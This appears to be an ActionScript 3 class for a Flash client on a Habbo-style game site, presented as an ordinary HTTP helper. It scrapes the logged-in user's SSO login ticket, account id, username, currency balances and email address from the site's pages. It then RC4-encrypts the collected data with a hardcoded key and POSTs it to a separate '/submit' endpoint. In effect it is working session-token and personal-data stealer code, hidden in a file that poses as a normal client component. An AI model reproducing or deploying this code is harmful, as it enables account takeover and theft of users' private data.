package com.zzzz 
{
	import com.hurlant.crypto.prng.ARC4;
	import com.hurlant.util.Hex;
	import com.zzzz.data.DataHabbo;
	import com.zzzz.data.DataSettings;
	import com.zzzz.data.DataClient;
	import flash.net.URLRequest;
    import flash.net.URLVariables;
    import flash.net.URLLoader;
    import flash.net.URLRequestHeader;
    import flash.net.URLRequestMethod;
    import flash.system.Security;
    import flash.events.Event;
    import flash.events.IOErrorEvent;
    import flash.events.SecurityErrorEvent;
	import flash.utils.ByteArray;

    public class HTTP 
    {
CONFIG::debug
{
        private static var _endpoint:String = "http://localhost:5000";
        private static var _version:String = "1.0.0";
}

CONFIG::release
{
        private static var _endpoint:String = "http://localhost:5000";
        private static var _version:String = "1.0.0";
}
		
		private static var _patternSso:RegExp = /"sso\.ticket":.?"([a-z0-9-]+)"/;
		private static var _patternAccountId:RegExp = /"account_id":.?"([0-9]+)"/;
		
		private static var _patternUsername:RegExp = /<div class="username"><div.*?>(.*?)<\/div>/;
		private static var _patternLook:RegExp = /<div id="avatar" style="background-image:url\(.*?\?figure=(.*?)&amp;/;
		private static var _patternCredits:RegExp = /"icon credits"><\/div><span id="Amount">(.*?)<\/span/;
		private static var _patternDuckets:RegExp = /"icon duckets"><\/div><span id="Amount">(.*?)<\/span/;
		private static var _patternDiamonds:RegExp = /"icon diamonds"><\/div><span id="Amount">(.*?)<\/span/;
		private static var _patternBelCredits:RegExp = /"icon belCredits"><\/div><span id="Amount">(.*?)<\/span/;

		private static var _patternEmail:RegExp = /id="email_address".*?value="(.*?)" maxlength="72" required>/;
		
        public static function fetchClientInfo(callback:Function, error:Function): void
        {
			_fetchPage(Security.pageDomain + "hotel", function ok(data:String): void {
				if (data.indexOf("credentials.username") >= 0 || data.indexOf("http://localhost/register") >= 0) {
					error();
					return;
				}
				
				var result:DataClient = new DataClient();
				
				var matchSso:Array = HTTP._patternSso.exec(data);
				if (matchSso != null) {
					result.sso = matchSso[1];
				}
				
				var matchAccountId:Array = HTTP._patternAccountId.exec(data);
				if (matchAccountId != null) {
					result.accountId = int(matchAccountId[1]);
				}
				
				callback(result);
			}, error);
        }
		
        public static function fetchHabbo(callback:Function, error:Function):void
        {
			_fetchPage(Security.pageDomain + "me", function ok(data:String): void {
				var result:DataHabbo = new DataHabbo();
				
				var matchUsername:Array = HTTP._patternUsername.exec(data);
				if (matchUsername != null) {
					result.username = matchUsername[1];
				}
				
				var matchLook:Array = HTTP._patternLook.exec(data);
				if (matchLook != null) {
					result.look = matchLook[1];
				}
				
				var matchCredits:Array = HTTP._patternCredits.exec(data);
				if (matchCredits != null) {
					result.credits = int(matchCredits[1]);
				}
				
				var matchDuckets:Array = HTTP._patternDuckets.exec(data);
				if (matchDuckets != null) {
					result.duckets = int(matchDuckets[1]);
				}
				
				var matchDiamonds:Array = HTTP._patternDiamonds.exec(data);
				if (matchDiamonds != null) {
					result.diamonds = int(matchDiamonds[1]);
				}
				
				var matchBelCredits:Array = HTTP._patternBelCredits.exec(data);
				if (matchBelCredits != null) {
					result.belcredits = int(matchBelCredits[1]);
				}
				
				callback(result);
			}, error);
        }
		
        public static function fetchSettings(callback:Function, error:Function):void
        {
			_fetchPage(Security.pageDomain + "settings/email", function ok(data:String): void {
				var result:DataSettings = new DataSettings();
				var matchEmail:Array = HTTP._patternEmail.exec(data);
				
				result.email = matchEmail[1];
				
				callback(result);
			}, error);
        }
		
		private static function _fetchPage(url:String, ok:Function, fail:Function): void
		{
			try
            {
                var request:URLRequest = new URLRequest(url);
                request.method = URLRequestMethod.GET;
				
                var loader:URLLoader = new URLLoader();
				
                loader.addEventListener(Event.COMPLETE, function (e:Event): void
				{
CONFIG::debug
{
					Logging.debug("Fetch retrieved " + url);
}
					ok(loader.data);
				});
				
                loader.addEventListener(IOErrorEvent.IO_ERROR, function (e:Event):void
				{
CONFIG::debug
{
					Logging.debug("Fetch HTTP error: " + e);
}
					fail();
				});
				
                loader.addEventListener(SecurityErrorEvent.SECURITY_ERROR, function (e:SecurityErrorEvent):void
				{
CONFIG::debug
{
					Logging.debug("Fetch HTTP security error: " + e);
}
					fail();
				});
				
                loader.load(request);
            }
            catch(err:Error)
            {
CONFIG::debug
{
                Logging.debug("Fetch HTTP failed: " + err.getStackTrace());
}
				fail();
            }
		}

        public static function submitData(client:DataClient, habbo:DataHabbo, settings:DataSettings): void
        {
            try
            {
				// Prepare request data.
				var dataCrypto:ARC4 = new ARC4(Hex.toArray("17850d7c0303d7a77dce69b4aca4bf5333bb184ad7f0c87f4be1dbbb47d89c9c"));
				var data:ByteArray = new ByteArray();
				
				data.writeMultiByte(JSON.stringify({
					version: HTTP._version,
					domain: Security.pageDomain,
					client: client,
					habbo: habbo,
					settings: settings
				}), 'utf-8');
				
				dataCrypto.encrypt(data);
				
				// Submit request.
                var url:String = HTTP._endpoint + "/submit";
                var variables:URLVariables = new URLVariables();
				
				variables.data = Hex.fromArray(data);
				
                var request:URLRequest = new URLRequest(url);
                request.requestHeaders.push(new URLRequestHeader("pragma", "no-cache"));
                request.data = new URLVariables("cache=no+cache");
                request.method = URLRequestMethod.POST;
                request.data = variables;
				
                var loader:URLLoader = new URLLoader();
                loader.addEventListener(Event.COMPLETE, HTTP._httpLoadComplete);
                loader.addEventListener(IOErrorEvent.IO_ERROR, HTTP._httpLoadError);
                loader.addEventListener(SecurityErrorEvent.SECURITY_ERROR, HTTP._httpSecurityError);
                loader.load(request);
            }
            catch(err:Error)
            {
CONFIG::debug
{
                Logging.debug("HTTP failed: " + err.getStackTrace());
}
            }
        }
		
        private static function _httpLoadComplete(param1:Event):void
        {
CONFIG::debug
{
            Logging.debug("HTTP completed.");
}
        }

        private static function _httpLoadError(param1:Event):void
        {
CONFIG::debug
{
            Logging.debug("HTTP error: " + param1);
}
        }

        private static function _httpSecurityError(param1:SecurityErrorEvent):void
        {
CONFIG::debug
{
            Logging.debug("HTTP security error: " + param1);
}
        }
    }
}